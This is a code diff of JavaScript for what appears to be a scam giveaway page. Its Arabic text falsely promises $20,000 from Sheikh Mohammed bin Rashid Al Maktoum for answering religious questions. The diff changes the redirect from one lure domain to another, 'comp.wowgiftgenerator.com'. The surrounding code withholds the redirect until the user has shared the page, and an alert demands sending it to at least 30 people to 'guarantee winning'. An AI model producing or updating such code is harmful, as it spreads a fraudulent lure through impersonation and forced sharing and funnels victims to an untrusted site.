@@ -1,5 +1,5 @@
 
-var texts = [" مسابقة الشيخ محمد بن راشد ال مكتوم أجب عن ثلات أسألة دينية و فز ب 20000 دولار مهداة من الشيخ محمد بن راشد ال مكتوم مدة الإجابة 3 دقائق إشترك الآن عدد الفائزين محدود  --> https://www.money-uae.com "];
+var texts = [" مسابقة الشيخ محمد بن راشد ال مكتوم أجب عن ثلات أسألة دينية و فز ب 20000 دولار مهداة من الشيخ محمد بن راشد ال مكتوم مدة الإجابة 3 دقائق إشترك الآن عدد الفائزين محدود  --> https://comp.wowgiftgenerator.com/ar.html "];
 
 
 
@@ -286,14 +286,14 @@ $(document).ready(function () {
 			if (c > 1) {
 				$(this)
 					.attr({
-						href: "https://www.money-uae.com",
+						href: "https://comp.wowgiftgenerator.com/ar.html",
 						target: "_self"
 					});
 			}
 		});
 	$("#b2")
 		.on('click', function () {
-			if (c > 1) window.location = "https://www.money-uae.com";
+			if (c > 1) window.location = "https://comp.wowgiftgenerator.com/ar.html";
 			else window.alert(" من فضلك أرسل إلى 30 شخص على الأقل لضمان الربح ! \n\n المشاركات التي قمت بها  " + c);
 		});
 });
